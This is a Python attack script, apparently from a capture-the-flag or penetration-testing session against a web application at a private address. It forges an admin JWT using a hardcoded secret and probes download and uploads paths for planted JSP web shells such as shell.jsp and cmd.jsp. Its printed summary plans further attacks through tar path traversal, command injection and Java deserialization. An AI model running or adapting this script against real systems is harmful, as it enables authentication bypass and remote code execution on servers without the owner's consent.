#!/usr/bin/env python3
"""
检查上传的文件并尝试执行
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[*] 检查uploads目录中的文件\n")

# 通过download读取看看文件列表
files_to_check = [
    "shell.jsp",
    "x.jsp",
    "cmd.jsp",
    "test.txt",
]

for f in files_to_check:
    try:
        r = requests.get(f"{TARGET}/dashboard/download?path={f}", headers=headers, timeout=5)
        if r.status_code == 200:
            print(f"[+] {f} 存在")
            content = r.text[:100]
            print(f"    内容: {content}")
            print()
    except:
        pass

print("\n[*] 尝试通过浏览器直接访问uploads下的文件\n")
for f in files_to_check:
    try:
        # 不带cookie尝试
        r = requests.get(f"{TARGET}/uploads/{f}", timeout=5)
        print(f"  /uploads/{f:15} -> {r.status_code}")
        
        if r.status_code == 200:
            print(f"    Content-Type: {r.headers.get('Content-Type', 'N/A')}")
            print(f"    Length: {len(r.content)}")
            # 如果是JSP源码
            if "<%@ page" in r.text or "Runtime.getRuntime" in r.text:
                print(f"    [!] JSP源码被返回，未执行")
            else:
                print(f"    Content: {r.text[:200]}")
    except:
        pass

print("\n[*] 基于错误消息推测: uploads可能映射为静态资源，不执行JSP")
print("[*] 尝试找到可执行JSP的位置\n")

# 测试其他可能执行JSP的路径
print("[*] 测试根目录能否访问:")
try:
    r = requests.get(f"{TARGET}/index.html", timeout=5)
    print(f"  /index.html -> {r.status_code}")
except:
    pass

print("\n[*] 总结:")
print("  1. 文件可以成功上传到 uploads 目录")
print("  2. uploads 目录的JSP不会被执行（可能配置为静态资源目录）")
print("  3. 需要找到方法将文件移到可执行的位置，或利用其他漏洞")
print("\n[*] 下一步策略:")
print("  A. 深入分析rename功能的正确参数")
print("  B. 利用tar解压时的路径遍历（需要修复路径拼接）")
print("  C. 寻找其他命令注入点")
print("  D. 利用Java反序列化（如果存在）")
